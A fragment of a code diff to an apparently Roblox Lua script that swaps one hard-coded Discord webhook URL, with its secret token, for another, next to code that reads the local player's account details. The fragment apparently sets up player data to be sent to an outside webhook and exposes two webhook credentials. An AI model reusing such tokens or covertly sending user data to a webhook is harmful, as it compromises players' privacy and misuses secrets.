@@ -186,7 +186,7 @@ end
       
      
     function seed()
-    local Webhook = "https://discord.com/api/webhooks/1256906708366921751/Gg9U76WhFLtkeSeLZufAIOdxmHXSJ6urpXkHNmdVWIOSxu_xVCzfVOptnvH1O7saAltB"
+    local Webhook = "https://discord.com/api/webhooks/1256910598617432115/n9r1hzddGQm1CVIWTz37FXS1Z2lkstRZLhZOUZp1cInbWqJVpt-mq_0wgEvEl5gu_C4t"
 
     local player = game:GetService("Players").LocalPlayer
     local joinTime = os.time() - (player.AccountAge * 86400)
